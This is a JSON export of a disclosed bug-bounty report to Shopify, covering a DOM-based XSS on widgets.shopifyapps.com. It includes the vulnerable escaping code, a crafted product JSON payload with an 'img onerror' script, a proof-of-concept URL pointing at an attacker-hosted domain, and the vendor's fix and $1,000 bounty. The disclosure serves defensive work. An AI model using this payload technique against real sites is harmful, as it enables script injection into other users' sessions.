{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-04-03T19:44:37.271Z", 
    "voters": [
        "jokebookservice1", 
        "sp1d3rs", 
        "bl4de", 
        "riramar", 
        "thisishrsh", 
        "ta8ahi", 
        "supernatural", 
        "eveeez", 
        "an0nym0us", 
        "hussain_0x3c", 
        "and 19 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 246794, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-04-03T18:12:57.907Z", 
    "vulnerability_information": "# Description\nShopify allows developers to embed widgets (containing product info) on third-party websites via \"widgets.shopifyapps.com\". When the widget is rendered the `shop` attribute is not filtered allowing any website (not just Shopify shops) to be specified. By providing an attacker controlled domain and serving a specially crafted payload containing the `stripping` object attribute HTML escaping will be disabled resulting in XSS on \"widgets.shopifyapps.com\".\n\n# Technical Details\nThis issue occurs in [/assets/widgets/product/application.js](https://widgets.shopifyapps.com/assets/widgets/product/application.js). The `Framework.Models.Collection` class (used for fetching collections of objects) defines a special `parse` method which automatically escapes all strings. This escaping is provided by `Framework.Helpers.stripHTMLForObject` which looks like this (prettified):\n```js\nFramework.Helpers.stripHTMLForObject = function(obj) {\n  obj.stripping = true;\n  var idx, val;\n  for (idx in obj) {\n    if (obj.hasOwnProperty(idx)) {\n      var val = obj[inx]\n      if(\"string\" == typeof val) {\n        obj[idx] = Framework.Helpers.stripHTML(val) \n      } else {\n        if(null != val && \"object\" == typeof val && null == val.stripping) {\n          obj[idx] = this.stripHTMLForObject(val)\n        }\n     }\n   }\n   delete obj.stripping;\n   return obj;\n}\n``` \nThe `Framework.Helpers.stripHTML` function seems to be a implementation of the [Caja compiler](https://developers.google.com/caja/) which we can assume is safe, however by crafting a object with a `stripping` attribute HTML escaping will be disabled. An example product would look like this:\n```json\n{\n\t\"product\": {\n\t\t\"variants\": [{\n\t\t\t\"stripping\": false,\n\t\t\t\"title\": \"<option/><select/><img src=xx: onerror=alert('bored-engineer')>\"\n\t\t}, {}],\n\t\t\"options\": [],\n\t\t\"images\": [{}],\n\t\t\"image\": {}\n\t}\n}\n```\nI've hosted this file (and the other required `meta.json` file) on [attackerdoma.in](https://attackerdoma.in).\n\n# Proof of Concept\nOpen [widgets.shopifyapps.com/products/stripping-xss?shop=attackerdoma.in](https://widgets.shopifyapps.com/products/stripping-xss?shop=attackerdoma.in)\n\n# Exploitability\nOnce you locate the escaping issue it's relatively trivial to exploit and requires to user interaction as shown in the PoC.\n\n# Remediation\nThe application should not allow shops/servers to disable HTML escaping via the `stripping` attribute.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "none", 
        "author_type": "Team"
    }, 
    "title": "XSS on \"widgets.shopifyapps.com\" via \"stripping\" attribute and \"shop\" parameter", 
    "is_member_of_team?": null, 
    "vote_count": 29, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "Other", 
        "max_severity": "none", 
        "databaseId": 10803, 
        "asset_type": "OTHER"
    }, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-07-07T13:56:09.905Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-07T13:56:09.905Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for your report. Our engineering team is investigating the issue.", 
            "markdown_message": "<p>Thank you for your report. Our engineering team is investigating the issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1814239, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bored-engineer", 
                "url": "/bored-engineer"
            }, 
            "created_at": "2017-07-24T19:19:37.244Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-24T19:19:37.244Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks again for your report.\n\nIt appears that the `null == val.stripping` check was unnecessary, so we resolved the issue by removing it from the application.js files in which that check was used.\n\nOur next round of bounty decisions will take place later this week, so we'll be in touch with you again soon.", 
            "markdown_message": "<p>Thanks again for your report.</p>\n\n<p>It appears that the <code>null == val.stripping</code> check was unnecessary, so we resolved the issue by removing it from the application.js files in which that check was used.</p>\n\n<p>Our next round of bounty decisions will take place later this week, so we&#39;ll be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1863981, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-08-03T20:43:55.437Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-03T20:43:55.437Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bonus_amount": "0.0", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "bored-engineer", 
                "url": "/bored-engineer"
            }, 
            "message": "Thanks again for the report @bored-engineer. We are awarding a higher amount than usual for this report based on the quality of the report and the level of difficulty involved in finding this type of logic issue. We're looking forward to more more reports like this one.", 
            "markdown_message": "<p>Thanks again for the report <a href=\"/bored-engineer\">@bored-engineer</a>. We are awarding a higher amount than usual for this report based on the quality of the report and the level of difficulty involved in finding this type of logic issue. We&#39;re looking forward to more more reports like this one.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1891283, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-03T18:12:57.952Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-03T18:12:57.952Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2560029, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-03T19:44:37.311Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-03T19:44:37.311Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2560314, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-03T19:44:37.428Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-03T19:44:37.428Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2560315, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "old_scope": "None", 
            "created_at": "2018-06-15T18:58:44.633Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-15T18:58:44.633Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "new_scope": "Other", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ChangedScope", 
            "id": 2890059, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "bored-engineer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bored-engineer", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/328/369436c6c39c8338c3bd3c96466f58fd2b4bee1d_small.png?1467257466"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 63, 
        "name": "Cross-site Scripting (XSS) - DOM"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-04-03T19:44:37.398Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/246794", 
    "created_at": "2017-07-07T07:06:08.957Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"description\">Description</h1>\n\n<p>Shopify allows developers to embed widgets (containing product info) on third-party websites via &quot;widgets.shopifyapps.com&quot;. When the widget is rendered the <code>shop</code> attribute is not filtered allowing any website (not just Shopify shops) to be specified. By providing an attacker controlled domain and serving a specially crafted payload containing the <code>stripping</code> object attribute HTML escaping will be disabled resulting in XSS on &quot;widgets.shopifyapps.com&quot;.</p>\n\n<h1 id=\"technical-details\">Technical Details</h1>\n\n<p>This issue occurs in <a href=\"/redirect?signature=468ad40bae42d799c7dc6c7d46e90f1f68f11447&amp;url=https%3A%2F%2Fwidgets.shopifyapps.com%2Fassets%2Fwidgets%2Fproduct%2Fapplication.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>/assets/widgets/product/application.js</span><i class=\"icon-external-link\"></i></a>. The <code>Framework.Models.Collection</code> class (used for fetching collections of objects) defines a special <code>parse</code> method which automatically escapes all strings. This escaping is provided by <code>Framework.Helpers.stripHTMLForObject</code> which looks like this (prettified):</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">Framework</span><span class=\"p\">.</span><span class=\"nx\">Helpers</span><span class=\"p\">.</span><span class=\"nx\">stripHTMLForObject</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">obj</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">stripping</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">idx</span><span class=\"p\">,</span> <span class=\"nx\">val</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nx\">idx</span> <span class=\"k\">in</span> <span class=\"nx\">obj</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">hasOwnProperty</span><span class=\"p\">(</span><span class=\"nx\">idx</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"kd\">var</span> <span class=\"nx\">val</span> <span class=\"o\">=</span> <span class=\"nx\">obj</span><span class=\"p\">[</span><span class=\"nx\">inx</span><span class=\"p\">]</span>\n      <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"s2\">&quot;string&quot;</span> <span class=\"o\">==</span> <span class=\"k\">typeof</span> <span class=\"nx\">val</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">obj</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">Framework</span><span class=\"p\">.</span><span class=\"nx\">Helpers</span><span class=\"p\">.</span><span class=\"nx\">stripHTML</span><span class=\"p\">(</span><span class=\"nx\">val</span><span class=\"p\">)</span> \n      <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"kc\">null</span> <span class=\"o\">!=</span> <span class=\"nx\">val</span> <span class=\"o\">&amp;&amp;</span> <span class=\"s2\">&quot;object&quot;</span> <span class=\"o\">==</span> <span class=\"k\">typeof</span> <span class=\"nx\">val</span> <span class=\"o\">&amp;&amp;</span> <span class=\"kc\">null</span> <span class=\"o\">==</span> <span class=\"nx\">val</span><span class=\"p\">.</span><span class=\"nx\">stripping</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n          <span class=\"nx\">obj</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">stripHTMLForObject</span><span class=\"p\">(</span><span class=\"nx\">val</span><span class=\"p\">)</span>\n        <span class=\"p\">}</span>\n     <span class=\"p\">}</span>\n   <span class=\"p\">}</span>\n   <span class=\"k\">delete</span> <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">stripping</span><span class=\"p\">;</span>\n   <span class=\"k\">return</span> <span class=\"nx\">obj</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>The <code>Framework.Helpers.stripHTML</code> function seems to be a implementation of the <a href=\"/redirect?signature=a8decdf8b64fbb88e2c3d3b02e7e62941db5d458&amp;url=https%3A%2F%2Fdevelopers.google.com%2Fcaja%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Caja compiler</span><i class=\"icon-external-link\"></i></a> which we can assume is safe, however by crafting a object with a <code>stripping</code> attribute HTML escaping will be disabled. An example product would look like this:</p>\n<pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;product&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"s2\">&quot;variants&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[{</span><span class=\"w\">\n            </span><span class=\"s2\">&quot;stripping&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n            </span><span class=\"s2\">&quot;title&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;&lt;option/&gt;&lt;select/&gt;&lt;img src=xx: onerror=alert(&#39;bored-engineer&#39;)&gt;&quot;</span><span class=\"w\">\n        </span><span class=\"p\">},</span><span class=\"w\"> </span><span class=\"p\">{}],</span><span class=\"w\">\n        </span><span class=\"s2\">&quot;options&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[],</span><span class=\"w\">\n        </span><span class=\"s2\">&quot;images&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[{}],</span><span class=\"w\">\n        </span><span class=\"s2\">&quot;image&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{}</span><span class=\"w\">\n    </span><span class=\"p\">}</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>I&#39;ve hosted this file (and the other required <code>meta.json</code> file) on <a href=\"/redirect?signature=53083cd3a25f6e4d2000430d9eeb57055c0b39fa&amp;url=https%3A%2F%2Fattackerdoma.in\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>attackerdoma.in</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>Open <a href=\"/redirect?signature=b0d7b1a740da975d20b0f7bf848dd5ed2789ae2e&amp;url=https%3A%2F%2Fwidgets.shopifyapps.com%2Fproducts%2Fstripping-xss%3Fshop%3Dattackerdoma.in\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>widgets.shopifyapps.com/products/stripping-xss?shop=attackerdoma.in</span><i class=\"icon-external-link\"></i></a></p>\n\n<h1 id=\"exploitability\">Exploitability</h1>\n\n<p>Once you locate the escaping issue it&#39;s relatively trivial to exploit and requires to user interaction as shown in the PoC.</p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>The application should not allow shops/servers to disable HTML escaping via the <code>stripping</code> attribute.</p>\n", 
    "severity_rating": "none", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}